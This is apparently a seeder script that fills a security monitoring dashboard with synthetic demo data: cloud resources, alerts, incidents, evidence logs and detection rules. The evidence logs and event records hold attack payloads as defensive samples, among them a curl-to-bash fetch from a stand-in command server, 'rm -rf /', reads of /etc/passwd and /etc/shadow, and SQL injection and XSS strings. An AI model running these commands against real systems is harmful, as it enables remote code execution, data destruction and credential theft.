"""
CloudShield Demo Data Seeder
"""
import uuid
import json
from datetime import datetime, timezone, timedelta
from models import db, User, CloudResource, SecurityFinding, SecurityEvent, Alert, Incident, IncidentNote, Evidence, DetectionRule
from modules.attack_detection import create_demo_event
from modules.evidence_manager import store_evidence_from_bytes


def seed_demo_data(app):
    """Create synthetic demo records. All records are clearly marked is_demo=True."""
    with app.app_context():
        _seed_users()
        _seed_resources()
        _seed_events()
        _seed_incidents()
        _seed_evidence(app)
        _seed_rules()
        print('[DEMO] Demo data seeded successfully.')


def _seed_users():
    demo_users = [
        ('analyst_demo', 'analyst@cloudshield.local', 'Demo@Analyst2024!', 'analyst'),
        ('viewer_demo',  'viewer@cloudshield.local',  'Demo@Viewer2024!',  'viewer'),
    ]
    for username, email, password, role in demo_users:
        if not User.query.filter_by(username=username).first():
            u = User(username=username, email=email, role=role, is_demo=True)
            u.set_password(password)
            db.session.add(u)
    db.session.commit()


def _seed_resources():
    resources = [
        # ── Original 8 ──────────────────────────────────────────────────────────
        {
            'resource_id': 'res-vm-001',
            'name': 'web-server-prod',
            'resource_type': 'vm',
            'owner': 'ops-team',
            'is_public': True,
            'encryption_enabled': True,
            'logging_enabled': False,
            'config_json': json.dumps({'ssh_open_to_all': True, 'os': 'Ubuntu 22.04', 'instance_type': 't3.medium'}),
        },
        {
            'resource_id': 'res-bkt-001',
            'name': 'data-backup-bucket',
            'resource_type': 'bucket',
            'owner': 'data-team',
            'is_public': True,
            'encryption_enabled': False,
            'logging_enabled': False,
            'config_json': json.dumps({'versioning_enabled': False, 'region': 'us-east-1'}),
        },
        {
            'resource_id': 'res-bkt-002',
            'name': 'static-assets-bucket',
            'resource_type': 'bucket',
            'owner': 'dev-team',
            'is_public': True,
            'encryption_enabled': True,
            'logging_enabled': True,
            'config_json': json.dumps({'versioning_enabled': True}),
        },
        {
            'resource_id': 'res-iam-001',
            'name': 'ci-cd-service-user',
            'resource_type': 'iam_user',
            'owner': 'devops-team',
            'is_public': False,
            'encryption_enabled': True,
            'logging_enabled': True,
            'config_json': json.dumps({'wildcard_permissions': True, 'mfa_required': False}),
        },
        {
            'resource_id': 'res-fw-001',
            'name': 'default-security-group',
            'resource_type': 'firewall',
            'owner': 'ops-team',
            'is_public': False,
            'encryption_enabled': True,
            'logging_enabled': False,
            'config_json': json.dumps({'allow_all_inbound': True, 'ssh_open_to_all': True}),
        },
        {
            'resource_id': 'res-db-001',
            'name': 'customer-db-prod',
            'resource_type': 'database',
            'owner': 'data-team',
            'is_public': True,
            'encryption_enabled': False,
            'logging_enabled': True,
            'config_json': json.dumps({'engine': 'PostgreSQL 15', 'multi_az': False}),
        },
        {
            'resource_id': 'res-vm-002',
            'name': 'bastion-host',
            'resource_type': 'vm',
            'owner': 'ops-team',
            'is_public': True,
            'encryption_enabled': True,
            'logging_enabled': True,
            'config_json': json.dumps({'ssh_open_to_all': False, 'os': 'Amazon Linux 2'}),
        },
        {
            'resource_id': 'res-role-001',
            'name': 'lambda-execution-role',
            'resource_type': 'iam_role',
            'owner': 'dev-team',
            'is_public': False,
            'encryption_enabled': True,
            'logging_enabled': True,
            'config_json': json.dumps({'wildcard_permissions': True, 'mfa_required': False}),
        },
        # ── Additional 8 ─────────────────────────────────────────────────────────
        {
            'resource_id': 'res-vm-003',
            'name': 'api-gateway-prod',
            'resource_type': 'vm',
            'owner': 'dev-team',
            'is_public': True,
            'encryption_enabled': True,
            'logging_enabled': True,
            'config_json': json.dumps({'os': 'Ubuntu 22.04', 'instance_type': 't3.large', 'tls_version': 'TLS1.2'}),
        },
        {
            'resource_id': 'res-bkt-003',
            'name': 'ml-training-data',
            'resource_type': 'bucket',
            'owner': 'ml-team',
            'is_public': False,
            'encryption_enabled': True,
            'logging_enabled': False,
            'config_json': json.dumps({'versioning_enabled': True, 'region': 'eu-west-1', 'lifecycle_policy': False}),
        },
        {
            'resource_id': 'res-db-002',
            'name': 'analytics-db-staging',
            'resource_type': 'database',
            'owner': 'analytics-team',
            'is_public': False,
            'encryption_enabled': False,
            'logging_enabled': False,
            'config_json': json.dumps({'engine': 'MySQL 8.0', 'multi_az': False, 'publicly_accessible': False}),
        },
        {
            'resource_id': 'res-iam-002',
            'name': 'data-pipeline-user',
            'resource_type': 'iam_user',
            'owner': 'data-team',
            'is_public': False,
            'encryption_enabled': True,
            'logging_enabled': False,
            'config_json': json.dumps({'wildcard_permissions': False, 'mfa_required': False, 'access_key_age_days': 412}),
        },
        {
            'resource_id': 'res-fw-002',
            'name': 'prod-alb-security-group',
            'resource_type': 'firewall',
            'owner': 'ops-team',
            'is_public': False,
            'encryption_enabled': True,
            'logging_enabled': True,
            'config_json': json.dumps({'allow_all_inbound': False, 'rdp_open_to_all': True, 'ssh_open_to_all': False}),
        },
        {
            'resource_id': 'res-vm-004',
            'name': 'jenkins-build-server',
            'resource_type': 'vm',
            'owner': 'devops-team',
            'is_public': True,
            'encryption_enabled': False,
            'logging_enabled': False,
            'config_json': json.dumps({'os': 'CentOS 7', 'instance_type': 't3.medium', 'end_of_life': True}),
        },
        {
            'resource_id': 'res-bkt-004',
            'name': 'audit-logs-archive',
            'resource_type': 'bucket',
            'owner': 'security-team',
            'is_public': False,
            'encryption_enabled': True,
            'logging_enabled': True,
            'config_json': json.dumps({'versioning_enabled': True, 'mfa_delete': False, 'region': 'us-east-1'}),
        },
        {
            'resource_id': 'res-role-002',
            'name': 'ec2-instance-profile',
            'resource_type': 'iam_role',
            'owner': 'ops-team',
            'is_public': False,
            'encryption_enabled': True,
            'logging_enabled': True,
            'config_json': json.dumps({'wildcard_permissions': True, 'attached_policies': ['AmazonS3FullAccess', 'AmazonEC2FullAccess']}),
        },
    ]
    for rd in resources:
        if not CloudResource.query.filter_by(resource_id=rd['resource_id']).first():
            r = CloudResource(**rd, is_demo=True)
            db.session.add(r)
    db.session.commit()

    # Run assessment on demo resources
    from modules.risk_assessment import run_full_assessment
    run_full_assessment()


def _demo_time(hours_ago):
    return datetime.now(timezone.utc).replace(tzinfo=None) - timedelta(hours=hours_ago)


def _seed_events():
    event_data = [
        # ── Original 12 ─────────────────────────────────────────────────────────
        ('auth_failure',       'high',   'Brute-force: 8 failed login attempts for user "admin" from 192.168.1.45',             'AUTH-BRUTE-001',  '192.168.1.45',    None,            48),
        ('auth_failure',       'low',    'Failed login attempt for user "john.doe" from 10.0.0.12',                              'AUTH-FAIL-001',   '10.0.0.12',       None,            46),
        ('sql_injection',      'high',   'Possible SQL injection in field "username": matched pattern "SELECT"',                 'SQLi-Pattern-001','185.220.101.5',   None,            40),
        ('xss_attempt',        'high',   'Possible XSS in field "comment": matched pattern "<script>"',                         'XSS-Pattern-001', '45.33.32.156',    None,            38),
        ('unauthorized_access','medium', 'Unauthorized access attempt to "/admin/users" from 192.168.1.100',                    'AUTHZ-DENY-001',  '192.168.1.100',   None,            36),
        ('path_traversal',     'high',   'Path traversal attempt in field "file": "../../../etc/passwd"',                       'TRAV-Pattern-001','104.21.45.67',    None,            30),
        ('auth_failure',       'low',    'Failed login attempt for user "service_account" from 172.16.0.5',                     'AUTH-FAIL-001',   '172.16.0.5',      None,            24),
        ('auth_success',       'info',   'Successful login for user "analyst_demo" from 127.0.0.1',                             'AUTH-OK-001',     '127.0.0.1',       None,            22),
        ('sql_injection',      'high',   'Possible SQL injection in field "search": "UNION SELECT * FROM users"',               'SQLi-Pattern-001','198.51.100.22',   None,            18),
        ('unauthorized_access','medium', 'Unauthorized access attempt to "/api/evidence/download" from 10.0.0.55',              'AUTHZ-DENY-001',  '10.0.0.55',       None,            12),
        ('auth_failure',       'high',   'Brute-force: 6 failed login attempts for user "root" from 203.0.113.1',               'AUTH-BRUTE-001',  '203.0.113.1',     None,            8),
        ('xss_attempt',        'high',   'Possible XSS in field "message": "javascript:alert(1)"',                             'XSS-Pattern-001', '185.220.101.9',   None,            4),
        # ── Additional 16 ────────────────────────────────────────────────────────
        ('auth_failure',       'high',   'Brute-force: 12 failed login attempts for user "sysadmin" from 91.108.56.3',         'AUTH-BRUTE-001',  '91.108.56.3',     None,            72),
        ('sql_injection',      'high',   'Blind SQLi detected in param "id": boolean-based pattern "AND 1=1"',                  'SQLi-BLIND-001',  '45.142.212.100',  None,            70),
        ('port_scan',          'medium', 'Port scan detected from 5.188.210.22 — 248 ports probed in 30s',                     'SCAN-PORT-001',   '5.188.210.22',    None,            68),
        ('auth_failure',       'low',    'Failed login for user "backup_svc" from 10.10.5.22',                                  'AUTH-FAIL-001',   '10.10.5.22',      None,            67),
        ('xss_attempt',        'high',   'Stored XSS payload in profile bio field: img src=x onerror=fetch(...)',              'XSS-Pattern-001', '77.91.68.45',     None,            65),
        ('command_injection',  'high',   'Command injection in "filename" param: "; rm -rf /; echo pwned"',                    'CMDI-Pattern-001','198.199.88.210',  None,            60),
        ('auth_success',       'info',   'Successful login for user "admin" from 10.0.0.1',                                    'AUTH-OK-001',     '10.0.0.1',        None,            58),
        ('unauthorized_access','medium', 'Unauthorised GET /api/admin/config by viewer_demo from 10.0.0.99',                   'AUTHZ-DENY-001',  '10.0.0.99',       'viewer_demo',   55),
        ('path_traversal',     'high',   'Path traversal via URL: GET /download?path=../../etc/shadow',                         'TRAV-Pattern-001','185.220.101.33',  None,            50),
        ('sql_injection',      'high',   'Time-based SQLi in "order" param: SLEEP(5) pattern detected',                        'SQLi-Pattern-001','104.21.90.22',    None,            44),
        ('auth_failure',       'medium', 'Credential stuffing: 22 unique usernames tried from 45.33.32.180 in 5 min',          'CRED-STUFF-001',  '45.33.32.180',    None,            42),
        ('port_scan',          'low',    'Internal network scan from 10.0.5.11 — 64 ports probed on 10.0.0.0/24',             'SCAN-PORT-001',   '10.0.5.11',       None,            35),
        ('command_injection',  'high',   'OS command injection via API: POST /api/run body={"cmd":"cat /etc/passwd"}',          'CMDI-Pattern-001','185.174.102.5',   None,            28),
        ('unauthorized_access','high',   'Privilege escalation attempt: analyst_demo accessed /admin/audit-logs',              'PRIVESC-001',     '127.0.0.1',       'analyst_demo',  20),
        ('xss_attempt',        'medium', 'Reflected XSS in search: ?q=svg/onload=alert(document.domain)',                     'XSS-Pattern-001', '192.241.214.5',   None,            10),
        ('auth_failure',       'high',   'Brute-force resumed: 9 failed attempts for "admin" from 91.108.56.3 (2nd wave)',     'AUTH-BRUTE-001',  '91.108.56.3',     None,            2),
    ]
    for category, severity, description, rule, ip, username, hours_ago in event_data:
        ev = SecurityEvent(
            event_id=str(uuid.uuid4()),
            timestamp=_demo_time(hours_ago),
            source_ip=ip,
            username=username,
            http_method='POST',
            endpoint='/login' if 'auth' in category else '/api/data',
            category=category,
            detection_rule=rule,
            severity=severity,
            description=description,
            raw_data='',
            is_demo=True,
        )
        db.session.add(ev)
        db.session.flush()

        if severity in ('critical', 'high', 'medium'):
            alert = Alert(
                alert_id=str(uuid.uuid4()),
                event_id=ev.id,
                title=description[:180],
                description=description,
                severity=severity,
                status='new',
                source_ip=ip,
                category=category,
                created_at=ev.timestamp,
                is_demo=True,
            )
            db.session.add(alert)

    db.session.commit()


def _seed_incidents():
    analyst = User.query.filter_by(username='analyst_demo').first()

    incidents = [
        # ── Original 3 ──────────────────────────────────────────────────────────
        {
            'incident_id': 'INC-2024-0001',
            'title': 'Suspected Brute-Force Campaign Against Admin Account',
            'description': 'Multiple failed login attempts detected from external IP 192.168.1.45 over a 2-hour window targeting the admin account. A successful login was subsequently observed from the same subnet.',
            'severity': 'high',
            'status': 'investigating',
            'notes': [
                'Initial triage complete. IP traced to Tor exit node.',
                'Account temporarily locked as a precautionary measure. Monitoring ongoing.',
            ],
        },
        {
            'incident_id': 'INC-2024-0002',
            'title': 'SQL Injection Attempt on API Endpoint',
            'description': 'Detection rule SQLi-Pattern-001 triggered on /api/data endpoint. Input contained UNION SELECT pattern. Request was rejected by ORM parameterisation but recorded for investigation.',
            'severity': 'high',
            'status': 'contained',
            'resolution_summary': 'Input validation confirmed effective. WAF rule added to block repeat attempts from offending IP range.',
            'notes': [
                'No data exfiltration confirmed. ORM parameterisation prevented execution.',
            ],
        },
        {
            'incident_id': 'INC-2024-0003',
            'title': 'Public S3-Equivalent Bucket Misconfiguration',
            'description': 'Security posture assessment identified data-backup-bucket as publicly accessible without encryption. This configuration violates the data protection policy.',
            'severity': 'critical',
            'status': 'open',
            'notes': [],
        },
        # ── Additional 3 ─────────────────────────────────────────────────────────
        {
            'incident_id': 'INC-2024-0004',
            'title': 'Command Injection Campaign via Upload API',
            'description': 'CMDI-Pattern-001 triggered twice within 30 minutes from IPs 198.199.88.210 and 185.174.102.5. Both payloads targeted the filename parameter of the /api/upload endpoint. The application framework sanitised inputs, but the pattern suggests an automated attack toolkit.',
            'severity': 'critical',
            'status': 'investigating',
            'notes': [
                'Both IPs geolocated to anonymous VPN exit nodes.',
                'Rate limiting applied to /api/upload. Security team notified.',
                'Forensic image of request logs collected as evidence.',
            ],
        },
        {
            'incident_id': 'INC-2024-0005',
            'title': 'Credential Stuffing Campaign Detected',
            'description': '22 unique usernames attempted from 45.33.32.180 within a 5-minute window. Pattern consistent with credential stuffing using breached credential lists. Two accounts (service_account, backup_svc) showed repeated targeting.',
            'severity': 'high',
            'status': 'contained',
            'resolution_summary': 'Source IP blocked at perimeter firewall. Affected accounts forced password reset. MFA advisory issued to all users.',
            'notes': [
                'OSINT check: IP listed on AbuseIPDB with 97 confidence score.',
                'Password reset notices sent. No successful authentications confirmed.',
            ],
        },
        {
            'incident_id': 'INC-2024-0006',
            'title': 'IAM Stale Access Keys — data-pipeline-user',
            'description': 'Routine posture scan flagged IAM user data-pipeline-user with an access key 412 days old without rotation. The key has broad S3 read/write permissions. Risk of key compromise from undetected breach is elevated.',
            'severity': 'medium',
            'status': 'open',
            'notes': [
                'Key rotation policy requires 90-day maximum. This key is 4x overdue.',
                'Contacted data-team lead for rotation scheduling.',
            ],
        },
    ]

    for idata in incidents:
        if Incident.query.filter_by(incident_id=idata['incident_id']).first():
            continue
        notes = idata.pop('notes', [])
        resolution = idata.pop('resolution_summary', None)
        inc = Incident(
            **idata,
            assigned_to=analyst.id if analyst else None,
            created_at=_demo_time(72),
            updated_at=_demo_time(1),
            resolution_summary=resolution,
            is_demo=True,
        )
        db.session.add(inc)
        db.session.flush()

        for note_text in notes:
            note = IncidentNote(
                incident_id=inc.id,
                author_id=analyst.id if analyst else 1,
                content=note_text,
                created_at=_demo_time(24),
            )
            db.session.add(note)

    db.session.commit()


def _seed_evidence(app):
    admin = User.query.filter_by(role='admin').first()
    if not admin:
        return

    evidence_items = [
        {
            'filename': 'auth_events_inc001.log',
            'incident_id_str': 'INC-2024-0001',
            'evidence_type': 'log_export',
            'description': 'Authentication event log export for INC-2024-0001 brute-force investigation. SYNTHETIC DEMO DATA.',
            'content': b"""# CloudShield Authentication Log Export
# Incident: INC-2024-0001 - Brute Force
# SYNTHETIC DEMO DATA

2024-01-15 08:12:01 UTC | FAIL | user=admin | ip=192.168.1.45 | rule=AUTH-FAIL-001
2024-01-15 08:12:15 UTC | FAIL | user=admin | ip=192.168.1.45 | rule=AUTH-FAIL-001
2024-01-15 08:12:34 UTC | FAIL | user=admin | ip=192.168.1.45 | rule=AUTH-FAIL-001
2024-01-15 08:12:58 UTC | FAIL | user=admin | ip=192.168.1.45 | rule=AUTH-BRUTE-001
2024-01-15 08:13:22 UTC | FAIL | user=admin | ip=192.168.1.45 | rule=AUTH-BRUTE-001
2024-01-15 08:13:47 UTC | FAIL | user=admin | ip=192.168.1.45 | rule=AUTH-BRUTE-001
2024-01-15 08:14:01 UTC | FAIL | user=admin | ip=192.168.1.45 | rule=AUTH-BRUTE-001
2024-01-15 08:14:33 UTC | FAIL | user=admin | ip=192.168.1.45 | rule=AUTH-BRUTE-001
""",
        },
        {
            'filename': 'sqli_request_inc002.log',
            'incident_id_str': 'INC-2024-0002',
            'evidence_type': 'log_export',
            'description': 'Raw HTTP request logs for INC-2024-0002 SQL injection attempts. SYNTHETIC DEMO DATA.',
            'content': b"""# CloudShield HTTP Request Log Export
# Incident: INC-2024-0002 - SQL Injection
# SYNTHETIC DEMO DATA

2024-01-16 14:22:01 UTC | POST /api/data | ip=185.220.101.5   | param=username | payload=admin' SELECT * FROM users--
2024-01-16 16:05:33 UTC | POST /api/data | ip=198.51.100.22   | param=search   | payload=1 UNION SELECT table_name,null FROM information_schema.tables--
2024-01-16 16:05:34 UTC | POST /api/data | ip=198.51.100.22   | param=order    | payload=1; SLEEP(5)--
STATUS: All requests blocked by ORM parameterisation. No data exfiltrated.
""",
        },
        {
            'filename': 'cmdi_payloads_inc004.log',
            'incident_id_str': 'INC-2024-0004',
            'evidence_type': 'log_export',
            'description': 'Captured command injection payloads for INC-2024-0004. SYNTHETIC DEMO DATA.',
            'content': b"""# CloudShield Command Injection Evidence
# Incident: INC-2024-0004 - Command Injection Campaign
# SYNTHETIC DEMO DATA

2024-01-17 10:00:01 UTC | POST /api/upload | ip=198.199.88.210 | param=filename | payload=report.pdf; rm -rf /
2024-01-17 10:00:03 UTC | POST /api/upload | ip=198.199.88.210 | param=filename | payload=$(curl http://c2.attacker.com/shell.sh | bash)
2024-01-17 10:28:55 UTC | POST /api/run   | ip=185.174.102.5  | body=cmd:cat /etc/passwd
2024-01-17 10:28:56 UTC | POST /api/run   | ip=185.174.102.5  | body=cmd:id && whoami && uname -a
STATUS: Application framework sanitised all inputs. No code executed.
""",
        },
    ]

    for item in evidence_items:
        if Evidence.query.filter_by(original_filename=item['filename']).first():
            continue
        inc = Incident.query.filter_by(incident_id=item['incident_id_str']).first()
        with app.app_context():
            store_evidence_from_bytes(
                content=item['content'],
                original_filename=item['filename'],
                evidence_type=item['evidence_type'],
                description=item['description'],
                incident_id=inc.id if inc else None,
                collector=admin,
                is_demo=True,
            )


def _seed_rules():
    rules = [
        # ── Original 6 ──────────────────────────────────────────────────────────
        ('SQLi-Pattern-001',  'SQL Injection Pattern Match',         'sql_injection',     'high',   r'SELECT|INSERT|DROP|UNION',       1,   60),
        ('XSS-Pattern-001',   'XSS Pattern Match',                   'xss_attempt',       'high',   r'<script>|javascript:|onerror=',  1,   60),
        ('TRAV-Pattern-001',  'Path Traversal Pattern Match',        'path_traversal',    'high',   r'\.\./|%2e%2e',                   1,   60),
        ('AUTH-FAIL-001',     'Failed Authentication',               'auth_failure',      'low',    'failed_login',                    1,   300),
        ('AUTH-BRUTE-001',    'Brute Force Login Threshold',         'auth_failure',      'high',   'failed_login',                    5,   900),
        ('AUTHZ-DENY-001',    'Unauthorized Access Attempt',         'unauthorized_access','medium','access_denied',                   1,   60),
        # ── Additional 5 ─────────────────────────────────────────────────────────
        ('CMDI-Pattern-001',  'Command Injection Pattern Match',     'command_injection',  'high',  r'rm -rf|curl.*sh|/etc/passwd',    1,   60),
        ('SQLi-BLIND-001',    'Blind SQL Injection Pattern',         'sql_injection',      'high',  r'AND 1=1|OR 1=1|SLEEP\(',         1,   60),
        ('SCAN-PORT-001',     'Port Scan Detection',                 'port_scan',          'medium','port_probe',                      50,  30),
        ('CRED-STUFF-001',    'Credential Stuffing Threshold',       'auth_failure',       'high',  'failed_login',                    15,  300),
        ('PRIVESC-001',       'Privilege Escalation Attempt',        'unauthorized_access','high',  'privilege_escalation',            1,   60),
    ]
    for name, desc, category, severity, pattern, threshold, window in rules:
        if not DetectionRule.query.filter_by(name=name).first():
            r = DetectionRule(
                name=name, description=desc, category=category,
                severity=severity, pattern=pattern,
                threshold=threshold, window_seconds=window,
            )
            db.session.add(r)
    db.session.commit()
